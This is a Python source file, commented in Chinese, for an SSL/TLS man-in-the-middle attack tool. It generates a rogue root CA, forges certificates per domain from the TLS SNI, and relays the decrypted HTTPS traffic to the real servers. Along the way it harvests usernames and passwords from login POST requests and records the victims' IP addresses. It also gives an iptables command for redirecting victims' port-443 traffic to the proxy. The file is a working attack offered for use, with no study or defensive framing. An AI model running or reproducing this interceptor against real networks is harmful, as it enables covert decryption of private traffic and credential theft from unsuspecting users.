#!/usr/bin/env python3
"""
SSL/TLS中間人攻擊模組
使用自簽名CA證書來攔截和解密HTTPS流量
"""

import socket
import ssl
import threading
import time
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from datetime import datetime, timedelta
import os
import json

class SSLMitm:
    def __init__(self, ca_cert_path="ca_cert.pem", ca_key_path="ca_key.pem", port=8443):
        """
        初始化SSL中間人攻擊器
        
        Args:
            ca_cert_path: CA證書路徑
            ca_key_path: CA私鑰路徑
            port: 監聽端口
        """
        self.ca_cert_path = ca_cert_path
        self.ca_key_path = ca_key_path
        self.port = port
        self.running = False
        self.server_socket = None
        self.captured_credentials = []
        self.cert_cache = {}  # 緩存生成的證書
        
        # 載入或創建CA證書
        self.ca_cert, self.ca_key = self._load_or_create_ca()
        
    def _load_or_create_ca(self):
        """載入現有的CA證書或創建新的"""
        if os.path.exists(self.ca_cert_path) and os.path.exists(self.ca_key_path):
            print(f"[*] 載入現有CA證書: {self.ca_cert_path}")
            try:
                with open(self.ca_cert_path, 'rb') as f:
                    ca_cert = x509.load_pem_x509_certificate(f.read())
                with open(self.ca_key_path, 'rb') as f:
                    ca_key = serialization.load_pem_private_key(f.read(), password=None)
                print("[+] CA證書載入成功")
                return ca_cert, ca_key
            except Exception as e:
                print(f"[!] 載入CA證書失敗: {e}")
                print("[*] 將創建新的CA證書")
        
        print("[*] 創建新的CA證書...")
        return self._create_ca()
    
    def _create_ca(self):
        """創建自簽名CA證書"""
        # 生成私鑰
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        
        # 創建證書
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "TW"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Taiwan"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "Taipei"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "MITM Proxy CA"),
            x509.NameAttribute(NameOID.COMMON_NAME, "MITM Proxy Root CA"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=3650)  # 10年有效期
        ).add_extension(
            x509.BasicConstraints(ca=True, path_length=None),
            critical=True,
        ).add_extension(
            x509.KeyUsage(
                digital_signature=True,
                content_commitment=False,
                key_encipherment=True,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=True,
                crl_sign=True,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        ).sign(private_key, hashes.SHA256())
        
        # 保存證書和私鑰
        with open(self.ca_cert_path, 'wb') as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        with open(self.ca_key_path, 'wb') as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        print(f"[+] CA證書已創建: {self.ca_cert_path}")
        print(f"[+] CA私鑰已創建: {self.ca_key_path}")
        print("[*] 請將CA證書安裝到目標系統的信任證書存儲中")
        
        return cert, private_key
    
    def _generate_certificate_for_domain(self, domain):
        """為指定域名生成證書"""
        if domain in self.cert_cache:
            return self.cert_cache[domain]
        
        print(f"[*] 為域名 {domain} 生成證書...")
        
        # 生成私鑰
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        
        # 創建證書
        subject = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "TW"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Taiwan"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "Taipei"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, domain),
            x509.NameAttribute(NameOID.COMMON_NAME, domain),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            self.ca_cert.subject
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.utcnow()
        ).not_valid_after(
            datetime.utcnow() + timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([
                x509.DNSName(domain),
                x509.DNSName(f"*.{domain}"),  # 支持子域名
            ]),
            critical=False,
        ).sign(self.ca_key, hashes.SHA256())
        
        # 緩存證書和私鑰
        self.cert_cache[domain] = (cert, private_key)
        
        return cert, private_key
    
    def _extract_sni(self, client_hello):
        """從TLS Client Hello中提取SNI（Server Name Indication）"""
        try:
            # TLS記錄層：跳過記錄頭（5字節）
            if len(client_hello) < 5:
                return None
            
            # 檢查是否為Handshake記錄（0x16）
            if client_hello[0] != 0x16:
                return None
            
            # 跳過TLS記錄頭，找到Handshake消息
            # 記錄長度在字節2-4
            record_length = (client_hello[3] << 8) | client_hello[4]
            
            if len(client_hello) < 5 + record_length:
                return None
            
            handshake = client_hello[5:]
            
            # 檢查是否為Client Hello（0x01）
            if len(handshake) < 1 or handshake[0] != 0x01:
                return None
            
            # 跳過Handshake消息頭（4字節：類型1字節 + 長度3字節）
            if len(handshake) < 4:
                return None
            
            client_hello_msg = handshake[4:]
            
            # 跳過版本（2字節）+ 隨機數（32字節）+ Session ID長度（1字節）
            if len(client_hello_msg) < 35:
                return None
            
            offset = 35
            session_id_length = client_hello_msg[34]
            offset += session_id_length
            
            # 跳過Cipher Suites長度（2字節）
            if len(client_hello_msg) < offset + 2:
                return None
            
            cipher_suites_length = (client_hello_msg[offset] << 8) | client_hello_msg[offset + 1]
            offset += 2 + cipher_suites_length
            
            # 跳過Compression Methods長度（1字節）
            if len(client_hello_msg) < offset + 1:
                return None
            
            compression_methods_length = client_hello_msg[offset]
            offset += 1 + compression_methods_length
            
            # 現在應該在Extensions部分
            if len(client_hello_msg) < offset + 2:
                return None
            
            extensions_length = (client_hello_msg[offset] << 8) | client_hello_msg[offset + 1]
            offset += 2
            
            # 遍歷Extensions查找SNI（類型0x0000）
            ext_end = offset + extensions_length
            while offset < ext_end and offset + 4 <= len(client_hello_msg):
                ext_type = (client_hello_msg[offset] << 8) | client_hello_msg[offset + 1]
                ext_length = (client_hello_msg[offset + 2] << 8) | client_hello_msg[offset + 3]
                offset += 4
                
                if ext_type == 0:  # SNI extension
                    if len(client_hello_msg) < offset + 2:
                        break
                    server_name_list_length = (client_hello_msg[offset] << 8) | client_hello_msg[offset + 1]
                    offset += 2
                    
                    if len(client_hello_msg) < offset + 3:
                        break
                    name_type = client_hello_msg[offset]
                    name_length = (client_hello_msg[offset + 1] << 8) | client_hello_msg[offset + 2]
                    offset += 3
                    
                    if name_type == 0 and len(client_hello_msg) >= offset + name_length:  # host_name
                        server_name = client_hello_msg[offset:offset + name_length].decode('utf-8', errors='ignore')
                        return server_name
                    break
                
                offset += ext_length
            
            return None
        except Exception as e:
            return None
    
    def _handle_client(self, client_socket, client_addr):
        """處理客戶端連接"""
        try:
            client_socket.settimeout(30)
            
            # 接收TLS Client Hello（不進行SSL握手，先讀取原始數據）
            client_hello = client_socket.recv(4096)
            
            if not client_hello:
                return
            
            # 從Client Hello中提取SNI
            host = self._extract_sni(client_hello)
            
            if not host:
                # 如果無法提取SNI，嘗試其他方法
                # 可以從iptables重定向的目標IP推斷，但這裡簡化處理
                print(f"[!] 無法從TLS握手提取SNI，跳過此連接")
                return
            
            # 移除端口號（如果有）
            if ':' in host:
                host = host.split(':')[0]
            
            print(f"[*] 處理連接到: {host}")
            
            # 為該域名生成證書
            cert, private_key = self._generate_certificate_for_domain(host)
            
            # 將證書和私鑰轉換為PEM格式
            cert_pem = cert.public_bytes(serialization.Encoding.PEM)
            key_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
            # 創建臨時證書文件
            import tempfile
            with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.pem') as cert_file:
                cert_file.write(cert_pem)
                cert_path = cert_file.name
            
            with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.key') as key_file:
                key_file.write(key_pem)
                key_path = key_file.name
            
            try:
                # 使用我們的證書與客戶端建立SSL連接
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain(cert_path, key_path)
                
                # 將socket包裝為SSL
                ssl_client = context.wrap_socket(client_socket, server_side=True)
                
                # 與真實服務器建立連接
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.settimeout(30)
                
                try:
                    server_socket.connect((host, 443))
                except socket.gaierror:
                    # DNS解析失敗，嘗試使用IP地址
                    import socket as sock
                    try:
                        ip = sock.gethostbyname(host)
                        server_socket.connect((ip, 443))
                    except:
                        print(f"[!] 無法連接到 {host}")
                        return
                
                # 與真實服務器建立SSL連接
                server_context = ssl.create_default_context()
                ssl_server = server_context.wrap_socket(server_socket, server_hostname=host)
                
                # 在兩個SSL連接之間轉發數據
                def forward_data(source, dest, name):
                    try:
                        while True:
                            data = source.recv(4096)
                            if not data:
                                break
                            dest.send(data)
                            
                            # 嘗試從解密後的HTTP數據中提取憑證
                            try:
                                decoded = data.decode('utf-8', errors='ignore')
                                if 'POST' in decoded and ('password' in decoded.lower() or 'login' in decoded.lower()):
                                    self._extract_credentials(decoded, client_addr)
                            except:
                                pass
                    except:
                        pass
                
                # 啟動轉發線程
                import threading
                client_to_server = threading.Thread(
                    target=forward_data,
                    args=(ssl_client, ssl_server, "client->server"),
                    daemon=True
                )
                server_to_client = threading.Thread(
                    target=forward_data,
                    args=(ssl_server, ssl_client, "server->client"),
                    daemon=True
                )
                
                client_to_server.start()
                server_to_client.start()
                
                # 等待線程結束
                client_to_server.join(timeout=300)
                server_to_client.join(timeout=300)
                
                ssl_server.close()
                ssl_client.close()
                
            finally:
                # 清理臨時文件
                try:
                    os.unlink(cert_path)
                    os.unlink(key_path)
                except:
                    pass
            
        except ssl.SSLError as e:
            # SSL錯誤，可能是客戶端拒絕了我們的證書
            pass
        except Exception as e:
            if "unknown" not in str(e).lower():
                print(f"[!] 處理客戶端錯誤: {e}")
        finally:
            try:
                client_socket.close()
            except:
                pass
    
    def _extract_credentials(self, data, client_addr):
        """從HTTP資料中提取憑證"""
        import urllib.parse
        import re
        
        try:
            # 提取POST body
            if '\r\n\r\n' in data:
                body = data.split('\r\n\r\n', 1)[1]
            else:
                body = data
            
            # 解析URL編碼資料
            try:
                parsed = urllib.parse.parse_qs(body)
                username = None
                password = None
                
                for key in ['user', 'username', 'email', 'login', 'userid', 'account']:
                    if key in parsed:
                        username = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                for key in ['password', 'passwd', 'pass', 'pwd']:
                    if key in parsed:
                        password = parsed[key][0] if parsed[key] else "N/A"
                        break
                
                if username or password:
                    credential = {
                        'username': username or "N/A",
                        'password': password or "N/A",
                        'source_ip': client_addr[0],
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_credentials:
                        self.captured_credentials.append(credential)
                        print(f"[+] 捕獲到憑證: {credential['username']} / {credential['password']} (來源: {credential['source_ip']})")
            except:
                # 使用正則表達式
                username_match = re.search(r'(?:user|username|email|login)=([^&\s\r\n]+)', data, re.IGNORECASE)
                password_match = re.search(r'(?:password|passwd|pass|pwd)=([^&\s\r\n]+)', data, re.IGNORECASE)
                
                if username_match or password_match:
                    username = urllib.parse.unquote(username_match.group(1)) if username_match else "N/A"
                    password = urllib.parse.unquote(password_match.group(1)) if password_match else "N/A"
                    
                    credential = {
                        'username': username,
                        'password': password,
                        'source_ip': client_addr[0],
                        'timestamp': time.time()
                    }
                    
                    if credential not in self.captured_credentials:
                        self.captured_credentials.append(credential)
                        print(f"[+] 捕獲到憑證: {username} / {password} (來源: {credential['source_ip']})")
        except Exception as e:
            pass
    
    def start(self):
        """啟動SSL中間人代理"""
        if self.running:
            return False
        
        try:
            # 創建服務器套接字
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.port))
            self.server_socket.listen(5)
            self.running = True
            
            print(f"[+] SSL中間人代理已啟動 (端口: {self.port})")
            print(f"[*] CA證書位置: {self.ca_cert_path}")
            print(f"[*] 請配置iptables將HTTPS流量重定向到此端口")
            print(f"[*] 命令: sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {self.port}")
            
            while self.running:
                try:
                    client_socket, client_addr = self.server_socket.accept()
                    # 在新線程中處理客戶端
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_socket, client_addr),
                        daemon=True
                    )
                    client_thread.start()
                except Exception as e:
                    if self.running:
                        print(f"[!] 接受連接錯誤: {e}")
        except Exception as e:
            print(f"[!] 啟動SSL中間人代理錯誤: {e}")
            self.running = False
            return False
        
        return True
    
    def stop(self):
        """停止SSL中間人代理"""
        if not self.running:
            return False
        
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        
        print("[+] SSL中間人代理已停止")
        return True
    
    def get_captured_credentials(self):
        """獲取捕獲的憑證"""
        return self.captured_credentials
    
    def get_ca_cert_path(self):
        """獲取CA證書路徑"""
        return self.ca_cert_path

